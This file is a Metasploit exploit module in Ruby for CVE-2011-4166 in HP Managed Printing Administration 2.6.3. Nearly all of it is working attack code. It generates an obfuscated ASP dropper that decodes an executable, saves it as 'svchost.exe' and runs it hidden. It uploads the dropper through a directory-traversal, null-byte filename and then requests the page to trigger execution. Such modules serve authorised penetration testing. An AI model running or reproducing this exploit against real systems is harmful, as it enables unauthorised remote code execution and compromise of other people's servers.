##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize
    super(
      'Name'        => 'HP Managed Printing Administration jobAcct Remote Command Execution',
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability on HP Managed Printing
        Administration 2.6.3 (and before). The vulnerability exists in the UploadFiles()
        function from the MPAUploader.Uploader.1 control, loaded and used by the server.
        The function can be abused via directory traversal and null byte injection in order
        to achieve arbitrary file upload.  In order to exploit successfully, a few conditions
        must be met: 1) A writable location under the context of Internet Guest Account
        (IUSR_*), or Everyone is required. By default, this module will attempt to write to
        /hpmpa/userfiles/, but you may specify the WRITEWEBFOLDER datastore option to provide
        another writable path. 2)  The writable path must also be readable by a browser,
        this typically means a location under wwwroot. 3) You cannot overwrite a file with
        the same name as the payload.
      },
      'Author'      => [
        'Andrea Micalizzi', # aka rgod - Vulnerability Discovery
        'juan vazquez' # Metasploit module
      ],
      'Platform'    => 'win',
      'References'  =>
        [
          ['CVE', '2011-4166'],
          ['OSVDB', '78015'],
          ['BID', '51174'],
          ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-352/'],
          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03128469']
        ],
      'Targets'     =>
        [
          [ 'HP Managed Printing Administration 2.6.3 / Microsoft Windows [XP SP3 | Server 2003 SP2]', { } ],
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => 'Dec 21 2011'
    )

    register_options(
      [
        OptString.new('WRITEWEBFOLDER', [ false,  "Additional Web location with file write permissions for IUSR_*" ])
      ], self.class)
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def webfolder_uri
    begin
      u = datastore['WRITEWEBFOLDER']
      u = "/" if u.nil? or u.empty?
      URI(u).to_s
    rescue ::URI::InvalidURIError
      print_error "Invalid URI: #{datastore['WRITEWEBFOLDER'].inspect}"
      return "/"
    end
  end

  def to_exe_asp(exes = '')

    var_func    = Rex::Text.rand_text_alpha(rand(8)+8)
    var_stream  = Rex::Text.rand_text_alpha(rand(8)+8)
    var_obj     = Rex::Text.rand_text_alpha(rand(8)+8)
    var_shell   = Rex::Text.rand_text_alpha(rand(8)+8)
    var_tempdir = Rex::Text.rand_text_alpha(rand(8)+8)
    var_tempexe = Rex::Text.rand_text_alpha(rand(8)+8)
    var_basedir = Rex::Text.rand_text_alpha(rand(8)+8)

    var_f64name   = Rex::Text.rand_text_alpha(rand(8)+8)
    arg_b64string = Rex::Text.rand_text_alpha(rand(8)+8)
    var_length    = Rex::Text.rand_text_alpha(rand(8)+8)
    var_out       = Rex::Text.rand_text_alpha(rand(8)+8)
    var_group     = Rex::Text.rand_text_alpha(rand(8)+8)
    var_bytes     = Rex::Text.rand_text_alpha(rand(8)+8)
    var_counter   = Rex::Text.rand_text_alpha(rand(8)+8)
    var_char      = Rex::Text.rand_text_alpha(rand(8)+8)
    var_thisdata  = Rex::Text.rand_text_alpha(rand(8)+8)
    const_base64  = Rex::Text.rand_text_alpha(rand(8)+8)
    var_ngroup    = Rex::Text.rand_text_alpha(rand(8)+8)
    var_pout      = Rex::Text.rand_text_alpha(rand(8)+8)

    vbs = "<%\r\n"

    # ASP Base64 decode from Antonin Foller http://www.motobit.com/tips/detpg_base64/
    vbs << "Function #{var_f64name}(ByVal #{arg_b64string})\r\n"
    vbs << "Const #{const_base64} = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\r\n"
    vbs << "Dim #{var_length}, #{var_out}, #{var_group}\r\n"
    vbs << "#{arg_b64string} = Replace(#{arg_b64string}, vbCrLf, \"\")\r\n"
    vbs << "#{arg_b64string} = Replace(#{arg_b64string}, vbTab, \"\")\r\n"
    vbs << "#{arg_b64string} = Replace(#{arg_b64string}, \" \", \"\")\r\n"
    vbs << "#{var_length} = Len(#{arg_b64string})\r\n"
    vbs << "If #{var_length} Mod 4 <> 0 Then\r\n"
    vbs << "Exit Function\r\n"
    vbs << "End If\r\n"
    vbs << "For #{var_group} = 1 To #{var_length} Step 4\r\n"
    vbs << "Dim #{var_bytes}, #{var_counter}, #{var_char}, #{var_thisdata}, #{var_ngroup}, #{var_pout}\r\n"
    vbs << "#{var_bytes} = 3\r\n"
    vbs << "#{var_ngroup} = 0\r\n"
    vbs << "For #{var_counter} = 0 To 3\r\n"
    vbs << "#{var_char} = Mid(#{arg_b64string}, #{var_group} + #{var_counter}, 1)\r\n"
    vbs << "If #{var_char} = \"=\" Then\r\n"
    vbs << "#{var_bytes} = #{var_bytes} - 1\r\n"
    vbs << "#{var_thisdata} = 0\r\n"
    vbs << "Else\r\n"
    vbs << "#{var_thisdata} = InStr(1, #{const_base64}, #{var_char}, vbBinaryCompare) - 1\r\n"
    vbs << "End If\r\n"
    vbs << "If #{var_thisdata} = -1 Then\r\n"
    vbs << "Exit Function\r\n"
    vbs << "End If\r\n"
    vbs << "#{var_ngroup} = 64 * #{var_ngroup} + #{var_thisdata}\r\n"
    vbs << "Next\r\n"
    vbs << "#{var_ngroup} = Hex(#{var_ngroup})\r\n"
    vbs << "#{var_ngroup} = String(6 - Len(#{var_ngroup}), \"0\") & #{var_ngroup}\r\n"
    vbs << "#{var_pout} = Chr(CByte(\"&H\" & Mid(#{var_ngroup}, 1, 2))) + _\r\n"
    vbs << "Chr(CByte(\"&H\" & Mid(#{var_ngroup}, 3, 2))) + _\r\n"
    vbs << "Chr(CByte(\"&H\" & Mid(#{var_ngroup}, 5, 2)))\r\n"
    vbs << "#{var_out} = #{var_out} & Left(#{var_pout}, #{var_bytes})\r\n"
    vbs << "Next\r\n"
    vbs << "#{var_f64name} = #{var_out}\r\n"
    vbs << "End Function\r\n"

    vbs << "Sub #{var_func}()\r\n"
    vbs << "#{var_bytes} = #{var_f64name}(\"#{Rex::Text.encode_base64(exes)}\")\r\n"
    vbs << "Dim #{var_obj}\r\n"
    vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
    vbs << "Dim #{var_stream}\r\n"
    vbs << "Dim #{var_tempdir}\r\n"
    vbs << "Dim #{var_tempexe}\r\n"
    vbs << "Dim #{var_basedir}\r\n"
    vbs << "Set #{var_tempdir} = #{var_obj}.GetSpecialFolder(2)\r\n"

    vbs << "#{var_basedir} = #{var_tempdir} & \"\\\" & #{var_obj}.GetTempName()\r\n"
    vbs << "#{var_obj}.CreateFolder(#{var_basedir})\r\n"
    vbs << "#{var_tempexe} = #{var_basedir} & \"\\\" & \"svchost.exe\"\r\n"
    vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(#{var_tempexe},2,0)\r\n"
    vbs << "#{var_stream}.Write #{var_bytes}\r\n"
    vbs << "#{var_stream}.Close\r\n"
    vbs << "Dim #{var_shell}\r\n"
    vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"

    vbs << "#{var_shell}.run #{var_tempexe}, 0, false\r\n"
    vbs << "End Sub\r\n"

    vbs << "#{var_func}\r\n"
    vbs << "%>\r\n"
    vbs
  end

  def upload(contents, location)
    post_data = Rex::MIME::Message.new
    post_data.add_part("upload", nil, nil, "form-data; name=\"upload\"")
    post_data.add_part(contents, "application/octet-stream", "binary", "form-data; name=\"uploadfile\"; filename=\"..\\../../wwwroot#{location}\x00.tmp\"")
    data = post_data.to_s
    data.gsub!(/\r\n\r\n--_Part/, "\r\n--_Part")

    res = send_request_cgi({
      'uri'      => normalize_uri("hpmpa", "jobAcct", "Default.asp"),
      'method'   => 'POST',
      'ctype'    => "multipart/form-data; boundary=#{post_data.bound}",
      'data'     => data,
      'encode_params' => false,
      'vars_get' => {
        'userId' => rand_text_numeric(2+rand(2)),
        'jobId'  => rand_text_numeric(2+rand(2))
        }
      })
    return res
  end

  def check
    res = send_request_cgi({'uri' => normalize_uri("hpmpa", "home", "Default.asp")})
    version = nil
    if res and res.code == 200 and res.body =~ /HP Managed Printing Administration/ and res.body =~ /<dd>v(.*)<\/dd>/
      version = $1
    else
      return Exploit::CheckCode::Safe
    end

    vprint_status("HP MPA Version Detected: #{version}")

    if version <= "2.6.3"
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe

  end

  def exploit
    # Generate the ASP containing the EXE containing the payload
    exe = generate_payload_exe
    # Not using Msf::Util::EXE.to_exe_asp because the generated vbs is too long and the app complains
    asp = to_exe_asp(exe)

    #
    # UPLOAD
    #
    asp_name = "#{rand_text_alpha(5+rand(3))}.asp"
    locations = [
      "/hpmpa/userfiles/images/printers/",
      "/hpmpa/userfiles/images/backgrounds/",
      "/hpmpa/userfiles/images/",
      "/hpmpa/userfiles/",
      "/"
    ]

    locations << normalize_uri(webfolder_uri, asp_name) if datastore['WRITEWEBFOLDER']

    payload_url = ""

    locations.each {|location|
      asp_location = location + asp_name
      print_status("#{peer} - Uploading #{asp.length} bytes to #{location}...")
      res = upload(asp, asp_location)
      if res and res.code == 200 and res.body =~ /Results of Upload/ and res.body !~ /Object\[formFile\]/
        print_good("#{peer} - ASP Payload successfully wrote to #{location}")
        payload_url = asp_location
        break
      elsif res and res.code == 200 and res.body =~ /Results of Upload/ and res.body =~ /Object\[formFile\]/
        print_error("#{peer} - Error probably due to permissions while writing to #{location}")
      else
        print_error("#{peer} - Unknown error while while writing to #{location}")
      end
    }

    if payload_url.empty?
      fail_with(Exploit::Failure::NotVulnerable, "#{peer} - Failed to upload ASP payload to the target")
    end

    #
    # EXECUTE
    #
    print_status("#{peer} - Executing payload through #{payload_url}...")
    send_request_cgi({ 'uri' => payload_url})
  end
end

